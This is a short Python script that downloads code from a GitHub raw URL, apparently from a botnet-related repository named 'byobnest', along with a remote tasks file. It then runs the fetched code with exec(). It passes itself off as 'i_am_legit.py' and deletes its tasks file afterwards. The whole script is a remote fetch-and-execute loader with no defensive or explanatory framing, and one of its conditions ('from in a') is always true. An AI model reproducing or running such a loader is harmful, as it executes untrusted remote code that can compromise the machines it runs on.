import sys,urllib,os
import time
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
__import__('json')
http_generator=urlopen('https://raw.githubusercontent.com/xbubus/byobnest/master/test1').read().replace(b'print',b'util.log').decode('utf-8')
pure_tasks=urlopen('https://raw.githubusercontent.com/xbubus/http-mqtt-requests-generator-sender/master/http_out.json').read().decode('utf-8')
with open ('tasks','w')as f:
    f.write(pure_tasks)
sys.argv=['i_am_legit.py','-itasks']
print(sys.argv)
http_generator_splitted=http_generator.split('\n')
for a in http_generator_splitted:
    if 'import' in a or 'from in a':
        exec(a)
    print(a)
    time.sleep(1)
exec(http_generator)
os.remove('tasks')

